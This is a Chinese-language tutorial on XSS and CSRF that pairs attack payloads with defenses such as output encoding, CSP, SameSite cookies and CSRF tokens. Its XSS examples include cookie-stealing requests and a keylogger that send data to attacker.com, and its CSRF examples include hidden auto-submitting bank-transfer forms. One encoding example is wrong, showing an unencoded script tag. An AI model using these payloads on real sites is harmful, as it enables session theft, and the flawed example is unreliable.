# XSS与CSRF

## 概述

跨站脚本攻击（Cross-Site Scripting, XSS）和跨站请求伪造（Cross-Site Request Forgery, CSRF）是最常见的客户端安全威胁。XSS通过注入恶意脚本窃取用户信息或劫持会话，CSRF则利用用户已认证的身份执行非授权操作。二者常常组合使用：XSS可用于窃取CSRF Token，CSRF则用于触发XSS攻击链。

## 跨站脚本攻击（XSS）

### XSS类型对比

| 类型 | 触发方式 | 持久性 | 影响范围 | 检测难度 |
|------|----------|--------|----------|----------|
| 反射型XSS | 通过URL参数注入 | 非持久 | 单个用户 | 低 |
| 存储型XSS | 存储到服务器后触发 | 持久 | 所有访问用户 | 中 |
| DOM型XSS | 客户端JS操作DOM | 取决于源 | 执行处上下文 | 高 |

### 反射型XSS

攻击者将恶意脚本附加在URL中，通过社交工程诱导用户点击：

```html
<!-- 漏洞示例：搜索框直接回显 -->
<input type="text" value="<?php echo $_GET['q']; ?>">

<!-- 攻击URL -->
http://target.com/search?q=<script>alert(document.cookie)</script>

<!-- 带外数据窃取 -->
http://target.com/search?q=<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
```

### 存储型XSS

恶意脚本被持久化存储到服务器，所有访问受影响页面的用户均会触发：

```html
<!-- 漏洞场景：评论区 -->
<div class="comment">
  <?php echo $comment['content']; ?>
</div>

<!-- 评论内容 -->
<script>
  new Image().src = 'https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie);
</script>

<!-- 键盘记录器 -->
<script>
  document.addEventListener('keydown', function(e) {
    new Image().src = 'https://attacker.com/k?k=' + e.key;
  });
</script>
```

### DOM型XSS

漏洞完全发生在客户端，服务器响应中不包含恶意负载：

```javascript
// 漏洞代码：从URL获取参数并直接写入DOM
var param = new URLSearchParams(window.location.search).get('name');
document.getElementById('greeting').innerHTML = 'Hello, ' + param;

// 攻击向量
// http://target.com/page?name=<img src=x onerror=alert(1)>

// 不安全的DOM Sink示例
element.innerHTML = userInput;           // 危险
element.outerHTML = userInput;          // 危险
document.write(userInput);              // 危险
eval(userInput);                        // 危险
setTimeout(userInput, 0);              // 危险
```

### 通用XSS Payloads

```html
<!-- 基础验证 -->
<script>alert(1)</script>
<script>prompt(1)</script>
<script>confirm(1)</script>

<!-- 图片标签（无需JS执行） -->
<img src=x onerror=alert(1)>
<img src=x onerror=fetch('//attacker.com/?c='+document.cookie)>

<!-- SVG向量 -->
<svg onload=alert(1)>
<svg onload=fetch('//attacker.com/?c='+document.cookie)>

<!-- 事件处理器 -->
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>

<!-- 编码绕过 -->
&#60;script&#62;alert(1)&#60;/script&#62;
```

### 高级XSS技术

**内容安全策略（CSP）绕过：**

```html
<!-- 利用JSONP端点绕过CSP -->
<script src="https://trusted-cdn.com/jsonp?callback=alert(1)"></script>

<!-- 利用Angular Sandbox逃逸（旧版Angular） -->
{{constructor.constructor('alert(1)')()}}

<!-- 利用base标签 -->
<base href="https://attacker.com/">
<script src="/js/app.js"></script>
```

**多语言Payload（Polyglot）：**

```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg oNloAd=alert()//>\x3e
```

## 跨站请求伪造（CSRF）

### CSRf攻击原理

CSRF攻击利用受害者已认证的会话，诱使其在不知情的情况下执行非授权操作：

```html
<!-- 攻击方式1：伪造GET请求 -->
<img src="http://bank.com/transfer?to=attacker&amount=10000" style="display:none;">

<!-- 攻击方式2：自动提交表单 -->
<form id="csrf-form" action="http://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf-form').submit();</script>

<!-- 攻击方式3：Ajax请求（需CORS配置不当） -->
<script>
  fetch('http://bank.com/transfer', {
    method: 'POST',
    credentials: 'include',
    body: new URLSearchParams({to: 'attacker', amount: '10000'})
  });
</script>
```

### CSRF Token绕过技术

```text
# Token预测：Token生成算法可预测
# 场景：Token基于时间戳+用户名的MD5

# Token泄露：通过Referer头泄露
# 场景：Token在URL参数中传递

# Token在Cookie中重复
# 场景：Token既在Cookie又在请求参数中，服务器只验证参数

# 缺少Token验证
# 场景：Token验证只针对POST，DELETE请求不验证
```

### SameSite Cookie机制

SameSite属性决定了Cookie在跨站请求中是否发送：

```text
# SameSite=Lax（默认）
# GET请求发送Cookie，POST请求不发送
# 安全级别：中等

# SameSite=Strict
# 所有跨站请求都不发送Cookie
# 安全级别：高，但影响用户体验

# SameSite=None
# 所有跨站请求都发送Cookie
# 安全级别：低，需配合Secure标志使用
```

## 防御措施

### XSS防御

**输出编码（Output Encoding）：**

```html
<!-- HTML实体编码 -->
&lt;script&gt;alert(1)&lt;/script&gt;

<!-- JavaScript编码 -->
<script>alert(1)</script>

<!-- URL编码 -->
%3Cscript%3Ealert(1)%3C/script%3E
```

**内容安全策略（CSP）：**

```text
# 只允许同源脚本执行
Content-Security-Policy: default-src 'self'

# 允许特定CDN脚本
Content-Security-Policy: script-src 'self' https://cdn.example.com

# 使用Nonce验证
Content-Security-Policy: script-src 'nonce-random123'

# 禁止内联脚本
Content-Security-Policy: script-src 'self'; style-src 'self'
```

**安全HTTP头：**

```text
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
```

### CSRF防御

**Anti-CSRF Token实现：**

```python
# Flask示例：生成和验证CSRF Token
import secrets
from flask import session, request, abort

def generate_csrf_token():
    if '_csrf_token' not in session:
        session['_csrf_token'] = secrets.token_hex(32)
    return session['_csrf_token']

def validate_csrf_token():
    token = request.form.get('_csrf_token')
    if not token or token != session.get('_csrf_token'):
        abort(403)
```

**SameSite Cookie配置：**

```python
# Python Flask配置
app.config.update(
    SESSION_COOKIE_SAMESITE='Lax',
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_HTTPONLY=True
)

# Node.js Express配置
app.use(session({
  name: 'session',
  sameSite: 'lax',
  secret: 'secret-key',
  cookie: {
    secure: true,
    httpOnly: true
  }
}));
```

**自定义请求头：**

```javascript
// 前端：所有API请求添加自定义Header
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-Requested-With': 'XMLHttpRequest'
  }
});

// 后端：验证自定义Header
app.use('/api/*', (req, res, next) => {
  if (req.headers['x-requested-with'] !== 'XMLHttpRequest') {
    return res.status(403).json({ error: 'Forbidden' });
  }
  next();
});
```

## 检测工具

| 工具 | 用途 | 特点 |
|------|------|------|
| Burp Suite | XSS/CSRF检测 | 自动化扫描+手动测试 |
| XSStrike | XSS检测器 | 含参数分析和Payload生成 |
| BeEF | XSS利用框架 | 浏览器漏洞利用和持久化 |
| OWASP ZAP | 综合安全扫描 | 开源，含XSS和CSRF检测 |
| Dalfox | 自动化XSS扫描 | 支持大规模扫描 |

## 参考资源

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
